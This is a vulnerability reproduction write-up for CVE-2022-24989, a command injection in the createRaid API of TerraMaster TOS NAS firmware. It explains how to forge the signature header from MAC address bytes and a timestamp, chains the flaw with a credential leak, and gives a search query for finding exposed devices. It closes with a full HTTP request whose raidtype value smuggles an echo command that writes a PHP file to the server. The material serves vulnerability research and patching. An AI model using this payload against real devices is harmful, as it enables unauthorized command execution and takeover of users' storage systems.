# TerraMaster TOS createRaid remote command execution vulnerability CVE-2022-24989

## Vulnerability Description

The createRaid method of the TerraMaster TOS mobile.class.php file has a remote command execution vulnerability. The attacker cooperates with the CVE-2022-24990 vulnerability to obtain server permissions.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">TerraMaster TOS < 4.2.31 </span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">"TerraMaster" && header="TOS"</span>

## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1647617923369-02e2a7e7-7705-4e12-a021-49ca44300125-20220319162830411.png)

We check the `createRaid method` in the `mobile.class.php file`, where the parameter `raidtype and parameter diskstring` are both controllable parameters

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1647671945531-f5329a4c-12dd-4957-b438-3001e66f146b.png)

Pay attention to this line of code and track the `volume_make_from_disks` method

```php
$ret = $vol->volume_make_from_disks($this->in['raidtype'], $filesystem, $disks, $volume_size);
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1647672020849-c216e10d-2c24-4476-8bf9-ef0936ea39cb.png)

You can see that the `$levelk` parameter in the method call is a controllable parameter. Passing it into the `_backexec` method can cause the command to be spliced ​​and executed malicious commands.

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1647672331076-640ed4a8-edbd-458b-a6c8-30e68b70ec64.png)

Back to the definition at the beginning of the `mobile.class.php` file

```php
static $notCheck = [
        "webNasIPS", "getDiskList", "createRaid", "getInstallStat", "getIsConfigAdmin", "setAdminConfig", "isConnected",'createid',
        'user_create','user_bond','user_release','login', 'logout', 'checkCode', "wapNasIPS"
    ];
    //不验证头信息是否匹配...
    static $notHeader = ["fileDownload", "videoPlay", "imagesThumb", "imagesView", "fileUpload", "tempClear", "wapNasIPS", "webNasIPS", "isConnected"];
    private static $U = null;
    private static $filter = array(".", "..", ".svn", "lost+found", "aquota.group", "aquota.user");
```

Found that the method name `createRaid` does not exist in the `$notHeader` array. Take a look at the definition in api.php

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1647676041684-2edf4cd9-527a-4032-b467-181f50477dd7.png)

```php
$instance = new $class();
if (!in_array($function, $class::$notHeader)) {
    #防止请求重放验证...
    if (tos_encrypt_str($_SERVER['HTTP_TIMESTAMP']) != $_SERVER['HTTP_SIGNATURE'] || $_SERVER['REQUEST_TIME'] - $_SERVER['HTTP_TIMESTAMP'] > 300) {
        $instance->output("Illegal request, timeout!", 0);
    }
}
$instance->$function();
```

Since there is a verification request header during instantiation, it is necessary to judge if it is used to call the method for command execution

```php
if (tos_encrypt_str($_SERVER['HTTP_TIMESTAMP']) != $_SERVER['HTTP_SIGNATURE'] || $_SERVER['REQUEST_TIME'] - $_SERVER['HTTP_TIMESTAMP'] > 300) {
        $instance->output("Illegal request, timeout!", 0);
    }
```

Seeing this, there are two main parameters that are worth paying attention to: `HTTP_TIMESTAMP` and `HTTP_SIGNATURE`

Tracking method tos_encrypt_str is not found in the source code. Let's check the list of php extension functions.

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1647677029047-a3d7d35e-581c-46b3-af90-42299e45ec6f.png)

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1647676739320-049b5cab-1197-4c01-a34e-df83e789fb8f.png)

Download this so file open with IDA Search string `tos_encrypt_str`

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1647676834698-5168b3ee-7126-499e-91c5-80b77d9cf0e2.png)

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1647676935156-1f51cd3b-0c11-4eaa-afcf-18851d93f0d3.png)

Follow-up method `get_mac_addr`

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1647676961925-d1d9b839-9594-45bf-ab6e-4dac2fd11300.png)

Here you can see the `mac` of the `eth0 network card`, and then go through `php_sprintf`, follow up `&ubk_38fa`

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1647677368472-e0c3db7d-e2a5-4b09-aa14-981b183931ef.png)

In fact, it gets the last 3 bytes of mac. For example, the mac address is: 11.22.33.44.55.66, and after passing it, it gets 445566

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1647677479277-7433cd43-6bb0-4451-b9ef-bd27b78a585b.png)

Go back to the execution of the function, we can know that in fact this function is equivalent to

```php
# mac addr 11:22:33:44:55:66
tos_encrypt_str(xxxxxx) = md5(445566xxxxxx)
```

Check out the previous judgment code

```php
$instance = new $class();
if (!in_array($function, $class::$notHeader)) {
    #防止请求重放验证...
    if (tos_encrypt_str($_SERVER['HTTP_TIMESTAMP']) != $_SERVER['HTTP_SIGNATURE'] || $_SERVER['REQUEST_TIME'] - $_SERVER['HTTP_TIMESTAMP'] > 300) {
        $instance->output("Illegal request, timeout!", 0);
    }
}
$instance->$function();
```

The TIMESTAMP parameter is the current timestamp, so the judgment logic here is very clear

```php
md5(mac地址后三字节 + 当前时间戳) = $_SERVER['HTTP_SIGNATURE']
```

Through the previously mentioned vulnerability `CVE-2022-24990` leaked PWD and mac addresses, we can use this command to execute the vulnerability and obtain information through the logic written by the POC just now

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/image-20220320004751660.png)

Write php malicious file in sending request packet

```php
POST /module/api.php?mobile/createRaid HTTP/1.1
Host: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Authorization: $1$hq6UR8XW$ti.QT5f9wQQg1PcJFWdub/
Cache-Control: max-age=0
Content-Length: 82
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=f1d33267c0ee0c34e9a348402205e272; tos_visit_time=1647670158
Signature: e856010781d0efd904d57ac40517859c
Timestamp: 1647678138
Upgrade-Insecure-Requests: 1
User-Agent: TNAS

raidtype=%3Becho+%22%3C%3Fphp+phpinfo%28%29%3B%3F%3E%22%3Evuln.php&diskstring=XXXX
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1647678418656-fda11f34-0721-4123-999d-16492413a06d.png)

Access to the written file

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1647678464951-45d58af7-9f32-4f0b-9d63-2059eb36682c.png)